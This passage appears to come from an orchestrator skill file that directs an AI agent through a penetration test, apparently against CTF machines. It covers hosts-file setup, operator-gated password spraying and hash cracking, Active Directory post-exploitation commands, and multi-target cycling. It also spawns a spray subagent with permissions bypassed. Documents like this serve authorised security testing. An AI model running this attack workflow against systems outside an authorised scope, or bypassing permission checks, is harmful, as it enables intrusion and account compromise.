attackbox before routing to any further skills.

**When to trigger:**
- After network-recon returns with a domain name or DC FQDN
- After web-discovery returns with vhost names
- After ANY skill returns reporting DNS resolution failure
- After recording any new hostname in state via `add_target()`

**Resolution check** (the orchestrator MAY run this directly):
```bash
getent hosts megabank.local
```
If exit code is non-zero, the hostname does not resolve.

**Hard stop procedure:**

1. Collect all unresolvable hostnames + their target IPs from engagement state
2. Write `temp_hosts-update.sh` with idempotent entries:
   ```bash
   #!/usr/bin/env bash
   set -euo pipefail
   # Add target hostnames to /etc/hosts
   # Generated by red-run orchestrator

   TARGET_IP="10.10.10.5"

   # Entries to add (only if not already present)
   entries=(
       "$TARGET_IP  megabank.local"
       "$TARGET_IP  resolute.megabank.local"
   )

   for entry in "${entries[@]}"; do
       hostname=$(echo "$entry" | awk '{print $2}')
       # Check /etc/hosts directly — getent can return false positives from DNS/mDNS
       if grep -qP "\\b${hostname}\\b" /etc/hosts 2>/dev/null; then
           echo "[=] Already in /etc/hosts: $hostname"
       else
           echo "$entry" | sudo tee -a /etc/hosts
           echo "[+] Added: $entry"
       fi
   done

   # Verify all entries resolve correctly
   echo ""
   echo "Verification:"
   for entry in "${entries[@]}"; do
       hostname=$(echo "$entry" | awk '{print $2}')
       if getent hosts "$hostname" > /dev/null 2>&1; then
           echo "[OK] $hostname -> $(getent hosts "$hostname" | awk '{print $1}')"
       else
           echo "[FAIL] $hostname does not resolve — check /etc/hosts manually"
           exit 1
       fi
   done
   ```
   Save as `temp_hosts-update.sh` and `chmod +x temp_hosts-update.sh`.
   **Important**: This script must be run with `bash`, not `sh` (bash arrays
   are not POSIX). Tell the operator: `sudo bash ./temp_hosts-update.sh`
3. Present the hard stop message:
   ```
   [orchestrator] HARD STOP — hosts file update required

   The following hostnames were discovered but do not resolve on this machine:
     - megabank.local → 10.129.96.155
     - resolute.megabank.local → 10.129.96.155

   AD and Kerberos tools will fail without these entries.

   Run: sudo ./temp_hosts-update.sh

   Confirm when done — no further engagement actions will be taken until
   the hosts file is updated.
   ```
4. **DO NOT** spawn any subagent, route to any skill, or continue the
   engagement loop while waiting for confirmation.
5. After operator confirms, verify each hostname resolves:
   ```bash
   getent hosts megabank.local
   ```
6. Clean up: `rm temp_hosts-update.sh`
7. Log to `engagement/activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → hosts-file-update
   - Hostnames added: megabank.local, resolute.megabank.local → 10.129.96.155
   - Operator confirmed, resuming engagement
   ```
8. Resume the engagement loop from where it was paused

This is always a hard stop — write the script, present it, wait for operator
intervention (sudo requirement).

### Usernames Found

When ANY skill returns with discovered usernames — network-recon via RPC/LDAP
null sessions, web-discovery via user enumeration, ad-discovery via
BloodHound/LDAP — the orchestrator MUST trigger this hard stop before
proceeding with credential attacks.

**Hard stop** — never auto-spray. Password spraying is high-OPSEC and risks
account lockouts. The operator must choose the intensity.

**When to trigger:**
- After recording new usernames in engagement state (from any skill)
- Only if authentication services are available (SMB, SSH, WinRM, LDAP,
  HTTP login, etc.)
- **Re-triggers when additional usernames are discovered later** — if a
  subsequent skill (ad-discovery, web-discovery, credential-dumping, SQLi
  user dump, etc.) returns NEW usernames not previously sprayed, trigger
  this hard stop again for the new users. Check which usernames already
  have credential test results in state vs. which are untested.
- Skip only if ALL discovered usernames have already been sprayed at the
  operator's chosen tier (check credential_access table via state)

**Hard stop procedure:**

1. Collect discovered usernames from engagement state
2. Identify available authentication services from the targets/ports tables
3. **Enumerate account lockout policy** before presenting spray options.

   a. **Check recon results first** — network-recon or ad-discovery may have
      already returned password policy / lockout info. Check the target's
      notes in engagement state and any evidence files for policy details
      (lockout threshold, observation window, lockout duration, min password
      length, complexity requirements).

   b. **If policy is known from recon**, display it in the hard stop message
      (see template below). Key fields: lockout threshold (0 = no lockout),
      observation window (minutes), lockout duration (minutes).

   c. **If policy is NOT known from recon**, query LDAP directly (this is on
      the allowed commands list as a safety-critical pre-spray check):
      ```bash
      ldapsearch -x -H ldap://TARGET -b "DC=DOMAIN,DC=LOCAL" -s base \
        '(objectClass=*)' lockoutThreshold lockOutObservationWindow \
        lockoutDuration minPwdLength pwdProperties
      ```
      Parse the output:
      - `lockoutThreshold: 0` = no lockout
      - Duration/window: divide abs(value) by 600,000,000 for minutes
        (e.g., `-18000000000` = 30 minutes)

   d. **If LDAP also fails** (anonymous bind not available), display
      "Lockout policy: unknown" in the hard stop message and note that the
      password-spray agent will enumerate it as its first step. If the agent
      discovers a dangerously low threshold (<=3), it will abort and report.

4. Present the hard stop with lockout context. Use `AskUserQuestion` with
   **two questions** — spray intensity and target services:

   Print the context block first (usernames, lockout policy), then call
   `AskUserQuestion` with both questions:

   **Context block** (print before the question):
   ```
   [orchestrator] HARD STOP — usernames discovered

   Found N usernames:
     - user1, user2, user3, ...

   Account lockout policy:
     - Lockout threshold: <N attempts or "0 (no lockout)" or "unknown">
     - Observation window: <N minutes or "unknown">
     - Lockout duration:   <N minutes or "unknown">
     - Min password length: <N or "unknown">
     - Complexity required: <yes/no or "unknown">
   ```

   **Question 1 — Spray intensity** (single-select):
   - Header: "Spray tier"
   - Options:
     - Light spray (Recommended) — username-as-password + common defaults (~30 passwords)
     - Medium spray — Light + SecLists 10k common passwords
     - Heavy spray — Medium + SecLists 100k passwords (NCSC)
     - Skip spraying — don't spray, continue engagement

   **Question 2 — Target services** (multi-select):
   - Header: "Services"
   - Build options dynamically from discovered ports on the target. Only
     include services that support password authentication. Common mappings:
     - SMB (445) → "SMB (445)"
     - WinRM (5985/5986) → "WinRM (5985)"
     - SSH (22) → "SSH (22)"
     - LDAP (389/636) → "LDAP (389)"
     - RDP (3389) → "RDP (3389)"
     - HTTP login (80/443) → "HTTP (80/443)" (only if login form discovered)
     - MSSQL (1433) → "MSSQL (1433)"
     - FTP (21) → "FTP (21)"
   - The "Other" option (always present in AskUserQuestion) lets the
     operator type custom services or a wordlist path

   If the operator selects "Skip spraying" for intensity, ignore the
   services selection.

5. After operator responds:
   - If **Skip**: Log to `activity.md` and continue engagement loop
   - Otherwise: Spawn **password-spray-agent** **in the background** with the
     selected tier and **only the selected services**:

```
Agent(
    subagent_type="password-spray-agent",
    mode="bypassPermissions",
    run_in_background=true,
    prompt="Load skill 'password-spraying'. Spray tier: <light/medium/heavy/custom>.
Target: <IP>. Services: <only operator-selected services, e.g. 'SMB 445, WinRM 5985'>.
Domain: <domain or 'N/A'>. Hostname: <hostname>.
Usernames: <list or path to file>.
Lockout policy: <threshold/window/duration if known, or 'unknown — enumerate first'>.
Custom wordlist: <path if custom, omit otherwise>.",
    description="Password spray on <target>"
)
```

6. **Immediately continue the engagement loop.** Spraying is independent of
   other discovery phases — it tests credentials against services (SMB, LDAP,
   SSH) while discovery enumerates attack surface via different channels
   (LDAP queries, BloodHound, ADCS templates, ACL analysis). No resource
   contention. Run the Step 5 decision logic and route to the next discovery
   skill (ad-discovery, web-discovery, etc.) without waiting for spray results.

   Spray and discovery are independent phases — spray tests credentials
   against services while discovery enumerates attack surface via different
   channels. No resource contention, so they overlap safely.

   The event watcher is already running (or spawn one if not). If the spray
   agent writes valid credentials via state-interim, the watcher catches them
   and notifies the orchestrator — no waiting for spray completion. Present
   new credentials and ask the operator about follow-up actions.

7. When the spray agent returns (auto-notified):
   - Parse the return summary — record valid credentials via
     `add_credential()`, test results via `test_credential()`, and any
     access gained via `add_access()`
   - Log to `engagement/activity.md`:
     ```
     ### [YYYY-MM-DD HH:MM:SS] orchestrator → password-spraying complete
     - Spray tier: <tier>, N usernames, M passwords per user
     - Valid credentials found: <count>
     - Access gained: <summary or 'none'>
     ```
   - If the spray found valid credentials while another skill is still running,
     record the findings and integrate them into the next routing decision.
     Do NOT interrupt the running skill.

Present the chain analysis and recommend next steps. Show the reasoning: "We
have SQLi on the web app. We could extract credentials and test them against
SMB, or we could try to get command execution via stacked queries."

### Hashes Found

When ANY skill returns with captured hashes (NTLMv2 from Responder, Kerberos
TGS from Kerberoasting, NTLM from SAM/LSASS, shadow file hashes, etc.) or
encrypted files that need cracking (ZIP, Office, KeePass, SSH keys), the
orchestrator MUST trigger this hard stop before spawning the cracking agent.

**Hard stop** — never auto-crack.
Operators may have dedicated cracking rigs with better GPUs. The operator
always chooses the cracking method.

**When to trigger:**
- After recording a hash credential in engagement state (from any skill)
- After discovering encrypted files that block progress
- Re-triggers when additional hashes are discovered later

**Hard stop procedure:**

1. Collect hash details: type, source, account, file path
2. Present the hard stop with hash context. Use `AskUserQuestion`:

   **Context block** (print before the question):
   ```
   [orchestrator] HARD STOP — hashes captured

   | Hash | Type | Account | File |
   |------|------|---------|------|
   | NTLMv2 | hashcat 5600 | flight\svc_apache | engagement/evidence/ntlmv2-svc_apache.txt |
   ```

   **Question — Cracking method** (single-select):
   - Header: "Cracking"
   - Options:
     - Crack locally (Recommended) — run hashcat/john on this machine
     - Export for external rig — hash file path provided, operator cracks
       externally and provides plaintext
     - Skip cracking — don't crack, continue engagement via other paths

3. After operator responds:
   - **Crack locally**: Spawn **credential-cracking-agent** with hash details,
     hash type, file path, and account context. Run in background.
   - **Export for external rig**: Print the hash file path and hashcat command
     line. Wait for the operator to provide the cracked plaintext. When
     provided, record via `add_credential()` (or `update_credential()` with
     `cracked=true` and the plaintext secret) and continue the engagement loop.
   - **Skip**: Log to `activity.md` and continue the engagement loop via
     other attack paths.

## Step 6: Post-Exploitation

When significant access is gained (shell, domain admin, database):

1. **Collect evidence** — save proof to `engagement/evidence/`
2. **Update state** — call state-writer MCP tools to record new access, credentials, and vulns
3. **Check objectives** — have we met the engagement goals?
4. **Continue or wrap up** — if objectives met, move to reporting. If not,
   continue chaining.

### Evidence Collection

**Important — Windows path quoting:** Paths with spaces (e.g.,
`C:\Documents and Settings\`) must use double quotes in cmd.exe. Without
quotes, cmd.exe splits on spaces and the command fails.

```bash
# On compromised host — collect proof
whoami /all
ipconfig /all
systeminfo

# Domain info if applicable
net user /domain
net group "Domain Admins" /domain

# Flags (quote paths with spaces — especially Windows XP)
type "C:\Documents and Settings\<user>\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
# Or on Vista+:
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

Save output to `engagement/evidence/` with descriptive filenames.

## Step 7: Multi-Target Engagements

When the scope includes multiple targets (multiple IPs, a subnet, a CTF with
several boxes), the orchestrator must process them methodically. Each subagent
invocation has isolated context, which prevents context pollution across
targets — but all routing decisions still flow through the orchestrator.

### Strategy: Phase-Based Cycling

Process all targets through the same phase before advancing, rather than
completing one target end-to-end before starting another. This enables
cross-pollination of discoveries (credentials from target A tested against
target B) and strategic prioritization.

**Phase 1 — Recon all targets:**
Invoke **network-recon** for each target (or once for the full scope). Build
the complete attack surface map in the engagement state before choosing where to attack.

**Phase 2 — Triage and prioritize:**
After recon, rank targets by exploitability:
1. Known CVEs with public exploits
2. Default/anonymous access (unauthenticated DB, open shares)
3. Web applications with discoverable attack surface
4. Services requiring credential attacks

**Phase 3 — Work the highest-value target:**
Route through discovery → technique skills for the top-priority target. When
you gain access or get blocked, record state changes via state-writer MCP and move to the next target.

**Phase 4 — Cross-pollinate:**
After each target yields credentials or access, check the engagement state for
opportunities on other targets:
- New creds → test against all targets with matching services
- New network access → check for internal-only services on other targets
- Patterns (same OS, same app framework) → apply same technique

**Phase 5 — Cycle back:**
Revisit blocked targets with new information. Repeat until all targets are
exhausted or objectives are met.

### What NOT To Do

- **Do not spawn built-in Task sub-agents (Explore, Plan, general-purpose) per
  target.** They lack MCP access and cannot invoke skills. Use only the custom
  domain subagents listed in the Skill-to-Agent Routing Table.
- **Do not go deep on one target while ignoring others.** If you're stuck on
  privesc for target A, move to target B. Fresh targets often yield quick wins
  that unlock progress elsewhere.
- **Cross-target parallelism is not supported.** Parallel Execution is for
  multiple paths on the **same target** (e.g., Kerberoasting + ACL abuse both
  targeting the same credential). For multi-target work, use Phase-Based
  Cycling — work one target at a time and cycle between them.

### State Management for Multiple Targets

The engagement state database tracks all targets in structured tables. Use the
state-interim MCP tools to query across targets:

- `get_state_summary()` — full overview of all targets, access, credentials,
  vulns, and pivot paths in one view
- `get_targets()` — list all discovered hosts with ports and services
- `get_credentials(untested_only=true)` — find credentials that haven't been
  tested against all services yet

After each skill invocation, check ALL targets for newly actionable state —
not just the target that was just worked on.

## Step 8: Reporting

When the engagement is complete (objectives met or testing window closed):

1. Call `get_state_summary()` for the full picture
2. Read `engagement/findings.md` for confirmed vulnerabilities
3. Summarize the attack narrative — how each chain progressed
4. Write up each finding in `engagement/findings.md` with severity, impact, evidence path, and reproduction steps.

### Engagement Summary Template

```markdown
# Engagement Summary

## Scope
<from scope.md>

## Attack Narrative
<Chronological story of the engagement: recon → initial access → pivoting →
objective completion>

## Key Findings
<Top findings by severity, with brief description and impact>

## Attack Chains
<Diagram or description of how vulnerabilities were chained>

## Recommendations
<Prioritized remediation guidance>
```

### Retrospective

After presenting the engagement summary, suggest running a retrospective:

> Engagement complete. Want to run a retrospective? It reviews skill routing
> decisions, identifies payload and methodology gaps, and produces actionable
> improvements to make the skills work better for you next time.

If the user agrees, route to **retrospective** — call `get_skill("retrospective")`
and follow its instructions.

## OPSEC Notes

- Recon phase (nmap, httpx) is relatively low-OPSEC but generates network
  traffic — use `-T2` or `--rate` flags if stealth is required
- Credential spraying can trigger lockouts — always check lockout policy first
- Technique skills have their own OPSEC ratings — check before routing
- In OPSEC-sensitive engagements, prefer passive recon and targeted testing
  over broad scanning

## Troubleshooting

### No Web Services Found

- Check if HTTP is on non-standard ports: `nmap -p- TARGET`
- Check for HTTPS-only: `nmap -sV -p 443,8443,8080,4443 TARGET`
- Check for virtual hosts: requires hostname, not just IP

### Credentials Not Working Across Services

- Different password policies per service
- Account may be disabled on target service
- Kerberos vs NTLM authentication differences
- Check for MFA on target service

### Stuck — No Clear Next Step

- Call `get_state_summary()` — look for unchained access or untested creds
- Check Blocked section — has context changed?
- Try broader recon: full port scan, UDP scan, subdomain enumeration
- Check for default credentials on discovered services
- Look for information disclosure: error pages, directory listings, exposed configs
